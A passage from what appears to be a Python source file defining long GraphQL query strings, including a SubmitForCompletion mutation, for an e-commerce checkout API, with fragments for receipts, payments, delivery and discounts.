GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}
"""

# ── GraphQL mutation: submit for completion ───────────────────────────────────
MUTATION_SUBMIT = """mutation SubmitForCompletion($input:NegotiationInput!,$attemptToken:String!,$metafields:[MetafieldInput!],$postPurchaseInquiryResult:PostPurchaseInquiryResultCode,$analytics:AnalyticsInput){submitForCompletion(input:$input attemptToken:$attemptToken metafields:$metafields postPurchaseInquiryResult:$postPurchaseInquiryResult analytics:$analytics){...on SubmitSuccess{receipt{...ReceiptDetails __typename}__typename}...on SubmitAlreadyAccepted{receipt{...ReceiptDetails __typename}__typename}...on SubmitFailed{reason __typename}...on SubmitRejected{buyerProposal{...BuyerProposalDetails __typename}sellerProposal{...ProposalDetails __typename}errors{...on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{message{code localizedDescription __typename}target __typename}...on AcceptNewTermViolation{message{code localizedDescription __typename}target __typename}...on ConfirmChangeViolation{message{code localizedDescription __typename}from to __typename}...on UnprocessableTermViolation{message{code localizedDescription __typename}target __typename}...on UnresolvableTermViolation{message{code localizedDescription __typename}target __typename}...on ApplyChangeViolation{message{code localizedDescription __typename}target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on InputValidationError{field __typename}...on PendingTermViolation{__typename}__typename}__typename}__typename}...on Throttled{pollAfter pollUrl queueToken buyerProposal{...BuyerProposalDetails __typename}__typename}...on CheckpointDenied{redirectUrl __typename}...on SubmittedForCompletion{receipt{...ReceiptDetails __typename}__typename}__typename}}fragment ReceiptDetails on Receipt{...on ProcessedReceipt{id token redirectUrl confirmationPage{url shouldRedirect __typename}orderStatusPageUrl shopPay shopPayInstallments analytics{checkoutCompletedEventId emitConversionEvent __typename}poNumber orderIdentity{buyerIdentifier id __typename}customerId isFirstOrder eligibleForMarketingOptIn purchaseOrder{...ReceiptPurchaseOrder __typename}orderCreationStatus{__typename}paymentDetails{paymentCardBrand creditCardLastFourDigits paymentAmount{amount currencyCode __typename}paymentGateway financialPendingReason paymentDescriptor buyerActionInfo{...on MultibancoBuyerActionInfo{entity reference __typename}__typename}__typename}shopAppLinksAndResources{mobileUrl qrCodeUrl canTrackOrderUpdates shopInstallmentsViewSchedules shopInstallmentsMobileUrl installmentsHighlightEligible mobileUrlAttributionPayload shopAppEligible shopAppQrCodeKillswitch shopPayOrder buyerHasShopApp buyerHasShopPay orderUpdateOptions __typename}postPurchasePageUrl postPurchasePageRequested postPurchaseVaultedPaymentMethodStatus paymentFlexibilityPaymentTermsTemplate{__typename dueDate dueInDays id translatedName type}__typename}...on ProcessingReceipt{id purchaseOrder{...ReceiptPurchaseOrder __typename}pollDelay __typename}...on WaitingReceipt{id pollDelay __typename}...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}...on CompletePaymentChallengeV2{challengeType challengeData __typename}__typename}timeout{millisecondsRemaining __typename}__typename}...on FailedReceipt{id processingError{...on InventoryClaimFailure{__typename}...on InventoryReservationFailure{__typename}...on OrderCreationFailure{paymentsHaveBeenReverted __typename}...on OrderCreationSchedulingFailure{__typename}...on PaymentFailed{code messageUntranslated hasOffsitePaymentMethod __typename}...on DiscountUsageLimitExceededFailure{__typename}...on CustomerPersistenceFailure{__typename}__typename}__typename}__typename}fragment ReceiptPurchaseOrder on PurchaseOrder{__typename sessionToken totalAmountToPay{amount currencyCode __typename}checkoutCompletionTarget delivery{...on PurchaseOrderDeliveryTerms{deliveryLines{__typename availableOn deliveryStrategy{handle title description methodType brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl lightThemeCompactLogoUrl darkThemeCompactLogoUrl name __typename}pickupLocation{...on PickupInStoreLocation{name address{address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}instructions __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}carrierCode carrierName name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyBreakdown{__typename amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId quantity componentCapabilities componentSource merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}lineAmount{amount currencyCode __typename}lineAmountAfterDiscounts{amount currencyCode __typename}destinationAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}__typename}groupType targetMerchandise{...on PurchaseOrderMerchandiseLine{stableId quantity{...on PurchaseOrderMerchandiseQuantityByItem{items __typename}__typename}merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}legacyFee __typename}...on PurchaseOrderBundleLineComponent{stableId quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}...on PurchaseOrderLineComponent{stableId componentCapabilities componentSource quantity merchandise{...on ProductVariantSnapshot{...ProductVariantSnapshotMerchandiseDetails __typename}__typename}__typename}__typename}}__typename}__typename}deliveryExpectations{__typename brandedPromise{name logoUrl handle lightThemeLogoUrl darkThemeLogoUrl __typename}deliveryStrategyHandle deliveryExpectationPresentmentTitle{short long __typename}returnability{returnable __typename}}payment{...on PurchaseOrderPaymentTerms{billingAddress{__typename...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}}paymentLines{amount{amount currencyCode __typename}postPaymentMessage dueAt paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier vaultingAgreement creditCard{brand lastDigits __typename}billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomerCreditCardPaymentMethod{brand displayLastDigits token deletable defaultPaymentMethod requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on PurchaseOrderGiftCardPaymentMethod{balance{amount currencyCode __typename}code __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier paymentMethod paymentAttributes __typename}...on PaypalWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token expiresAt __typename}...on ApplePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}data signature version __typename}...on GooglePayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}signature signedMessage protocolVersion __typename}...on FacebookPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}containerData containerId mode __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken creditCard{brand lastDigits __typename}__typename}__typename}__typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on LocalPaymentMethod{paymentMethodIdentifier name displayName billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}additionalParameters{...on IdealPaymentMethodParameters{bank __typename}__typename}__typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on OffsitePaymentMethod{paymentMethodIdentifier name billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on ManualPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on CustomPaymentMethod{additionalDetails name paymentInstructions id paymentMethodIdentifier billingAddress{...on StreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on InvalidBillingAddress{__typename}__typename}__typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on PaypalBillingAgreementPaymentMethod{token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}...on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{redemptionPaymentOptionKind billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}__typename}__typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name __typename}__typename}__typename}__typename}__typename}buyerIdentity{...on PurchaseOrderBuyerIdentityTerms{contactMethod{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}marketingConsent{...on PurchaseOrderEmailContactMethod{email __typename}...on PurchaseOrderSMSContactMethod{phoneNumber __typename}__typename}__typename}customer{__typename...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}__typename}...on DecodedCustomerProfile{id presentmentCurrency fullName firstName lastName countryCode email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone __typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl email ordersCount phone market{id handle __typename}__typename}}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name __typename}__typename}__typename}merchandise{taxesIncluded merchandiseLines{stableId legacyFee merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}lineComponents{...PurchaseOrderBundleLineComponent __typename}components{...PurchaseOrderLineComponent __typename}quantity{__typename...on PurchaseOrderMerchandiseQuantityByItem{items __typename}}recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}lineAmount{__typename amount currencyCode}__typename}__typename}tax{totalTaxAmountV2{__typename amount currencyCode}totalDutyAmount{amount currencyCode __typename}totalTaxAndDutyAmount{amount currencyCode __typename}totalAmountIncludedInTarget{amount currencyCode __typename}__typename}discounts{lines{...PurchaseOrderDiscountLineFragment __typename}__typename}legacyRepresentProductsAsFees totalSavings{amount currencyCode __typename}subtotalBeforeTaxesAndShipping{amount currencyCode __typename}legacySubtotalBeforeTaxesShippingAndFees{amount currencyCode __typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}dutiesIncluded tip{tipLines{amount{amount currencyCode __typename}__typename}__typename}hasOnlyDeferredShipping note{customAttributes{key value __typename}message __typename}shopPayArtifact{optIn{vaultPhone __typename}__typename}recurringTotals{fixedPrice{amount currencyCode __typename}fixedPriceCount interval intervalCount recurringPrice{amount currencyCode __typename}title __typename}checkoutTotalBeforeTaxesAndShipping{__typename amount currencyCode}checkoutTotal{__typename amount currencyCode}checkoutTotalTaxes{__typename amount currencyCode}subtotalBeforeReductions{__typename amount currencyCode}deferredTotal{amount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}dueAt subtotalAmount{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}taxes{__typename...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}}__typename}metafields{key namespace value valueType:type __typename}}fragment ProductVariantSnapshotMerchandiseDetails on ProductVariantSnapshot{variantId options{name value __typename}productTitle title productUrl untranslatedTitle untranslatedSubtitle sellingPlan{name id digest deliveriesPerBillingCycle prepaid subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}deferredAmount{amount currencyCode __typename}digest giftCard image{altText one:url(transform:{maxWidth:64,maxHeight:64})two:url(transform:{maxWidth:128,maxHeight:128})four:url(transform:{maxWidth:256,maxHeight:256})__typename}price{amount currencyCode __typename}productId productType properties{...MerchandiseProperties __typename}requiresShipping sku taxCode taxable vendor weight{unit value __typename}__typename}fragment MerchandiseProperties on MerchandiseProperty{name value{...on MerchandisePropertyValueString{string:value __typename}...on MerchandisePropertyValueInt{int:value __typename}...on MerchandisePropertyValueFloat{float:value __typename}...on MerchandisePropertyValueBoolean{boolean:value __typename}...on MerchandisePropertyValueJson{json:value __typename}__typename}visible __typename}fragment DiscountDetailsFragment on Discount{...on CustomDiscount{title description presentationLevel allocationMethod targetSelection targetType signature signatureUuid type value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on CodeDiscount{title code presentationLevel allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}...on DiscountCodeTrigger{code __typename}...on AutomaticDiscount{presentationLevel title allocationMethod message targetSelection targetType value{...on PercentageValue{percentage __typename}...on FixedAmountValue{appliesOnEachItem fixedAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}fragment PurchaseOrderBundleLineComponent on PurchaseOrderBundleLineComponent{stableId merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderLineComponent on PurchaseOrderLineComponent{stableId componentCapabilities componentSource merchandise{...ProductVariantSnapshotMerchandiseDetails __typename}lineAllocations{checkoutPriceAfterDiscounts{amount currencyCode __typename}checkoutPriceAfterLineDiscounts{amount currencyCode __typename}checkoutPriceBeforeReductions{amount currencyCode __typename}quantity stableId totalAmountAfterDiscounts{amount currencyCode __typename}totalAmountAfterLineDiscounts{amount currencyCode __typename}totalAmountBeforeReductions{amount currencyCode __typename}discountAllocations{__typename amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index}unitPrice{measurement{referenceUnit referenceValue __typename}price{amount currencyCode __typename}__typename}__typename}quantity recurringTotal{fixedPrice{__typename amount currencyCode}fixedPriceCount interval intervalCount recurringPrice{__typename amount currencyCode}title __typename}totalAmount{__typename amount currencyCode}__typename}fragment PurchaseOrderDiscountLineFragment on PurchaseOrderDiscountLine{discount{...DiscountDetailsFragment __typename}lineAmount{amount currencyCode __typename}deliveryAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}merchandiseAllocations{amount{amount currencyCode __typename}discount{...DiscountDetailsFragment __typename}index stableId targetType __typename}__typename}fragment BuyerProposalDetails on Proposal{buyerIdentity{...on FilledBuyerIdentityTerms{email phone customer{...on CustomerProfile{email __typename}...on BusinessCustomerProfile{email __typename}__typename}__typename}__typename}merchandiseDiscount{...ProposalDiscountFragment __typename}deliveryDiscount{...ProposalDiscountFragment __typename}delivery{...ProposalDeliveryFragment __typename}merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}components{...MerchandiseLineComponentWithCapabilities __typename}legacyFee __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}__typename}fragment ProposalDiscountFragment on DiscountTermsV2{__typename...on FilledDiscountTerms{acceptUnexpectedDiscounts lines{...DiscountLineDetailsFragment __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment DiscountLineDetailsFragment on DiscountLine{allocations{...on DiscountAllocatedAllocationSet{__typename allocations{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}target{index targetType stableId __typename}__typename}}__typename}discount{...DiscountDetailsFragment __typename}lineAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment ProposalDeliveryFragment on DeliveryTerms{__typename...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken deliveryLines{destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType deliveryMethodTypes selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}...on DeliveryStrategyReference{handle __typename}__typename}availableDeliveryStrategies{...on CompleteDeliveryStrategy{title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms brandedPromise{logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name __typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment FilledMerchandiseLineTargetCollectionFragment on FilledMerchandiseLineTargetCollection{linesV2{...on MerchandiseLine{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseBundleLineComponent{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on MerchandiseLineComponentWithCapabilities{stableId quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}merchandise{...DeliveryLineMerchandiseFragment __typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}fragment DeliveryLineMerchandiseFragment on ProposalMerchandise{...on SourceProvidedMerchandise{__typename requiresShipping}...on ProductVariantMerchandise{__typename requiresShipping}...on ContextualizedProductVariantMerchandise{__typename requiresShipping sellingPlan{id digest name prepaid deliveriesPerBillingCycle subscriptionDetails{billingInterval billingIntervalCount billingMaxCycles deliveryInterval deliveryIntervalCount __typename}__typename}}...on 